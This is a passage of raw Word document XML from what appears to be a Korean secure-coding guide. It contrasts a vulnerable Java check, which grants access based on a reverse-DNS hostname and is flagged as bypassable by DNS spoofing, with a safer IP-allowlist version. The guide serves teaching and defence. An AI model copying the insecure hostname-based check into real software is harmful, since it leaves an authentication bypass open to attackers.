              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>InetAddress addr = InetAddress.getByName(clientIp);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String hostname = addr.getHostName();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (hostname.endsWith(".bkr.kr")) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">grantAccess();  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DNS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스푸핑으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>우회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">DNS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스푸핑</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> IP</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역방향</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결과를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> legitimate.bkr.kr </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조작하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>신뢰하지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>통과합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. DNS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>캐시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포이즈닝이나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DNS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>침투만으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임의의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부망</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>부여됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] IP </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기반</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>또는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>토큰</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기반</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String clientIp = request.getRemoteAddr();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>List&lt;String&gt; allowedIps = Arrays.asList("10.0.0.1", "10.0.0.2");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (!allowedIps.contains(clientIp)) throw new AccessDeniedException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>거부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:sectPr w:rsidR="00B30C6E" w:rsidSect="00034616"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B4171" w:rsidRDefault="002B4171" w:rsidP="0084736D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="002B4171" w:rsidRDefault="002B4171" w:rsidP="0084736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Mincho">
    <w:altName w:val="Yu Gothic UI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Pretendard Variable Light">
    <w:panose1 w:val="02000003000000020004"/>
    <w:charset w:val="81"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="E10002FF" w:usb1="1BD7E5FF" w:usb2="04000011" w:usb3="00000000" w:csb0="000801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Pretendard Variable Medium">
    <w:panose1 w:val="02000003000000020004"/>
    <w:charset w:val="81"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="E10002FF" w:usb1="1BD7E5FF" w:usb2="04000011" w:usb3="00000000" w:csb0="000801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B4171" w:rsidRDefault="002B4171" w:rsidP="0084736D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="002B4171" w:rsidRDefault="002B4171" w:rsidP="0084736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BE15AF0"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="08AE45CA"/>
    <w:lvl w:ilvl="0" w:tplc="318E93B4">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="473" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Wingdings" w:cstheme="minorBidi" w:hint="default"/>
        <w:sz w:val="17"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="04090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="913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13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13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13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13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13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13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13" w:hanging="400"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="10" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3E97663B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9EE68AAE"/>
    <w:lvl w:ilvl="0" w:tplc="B60A4BF6">
      <w:start w:val="2026"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Pretendard Variable Light" w:eastAsia="Pretendard Variable Light" w:hAnsi="Pretendard Variable Light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1" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3FDD5059"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="324CEECE"/>
    <w:lvl w:ilvl="0" w:tplc="7668FA3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19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굴림" w:eastAsia="굴림" w:hAnsi="굴림" w:cs="Times New Roman" w:hint="eastAsia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  <w:num w:numId="11">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="1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2"/>
  <w:bordersDoNotSurroundHeader/>
  <w:bordersDoNotSurroundFooter/>
  <w:activeWritingStyle w:appName="MSWord" w:lang="en-US" w:vendorID="64" w:dllVersion="131078" w:nlCheck="1" w:checkStyle="0"/>
  <w:activeWritingStyle w:appName="MSWord" w:lang="ko-KR" w:vendorID="64" w:dllVersion="131077" w:nlCheck="1" w:checkStyle="1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029DB"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="00064ED4"/>
    <w:rsid w:val="0007172E"/>
    <w:rsid w:val="000E2F15"/>
    <w:rsid w:val="000E3151"/>
    <w:rsid w:val="00126989"/>
    <w:rsid w:val="001301B8"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="001E295D"/>
    <w:rsid w:val="00255962"/>
    <w:rsid w:val="00270E83"/>
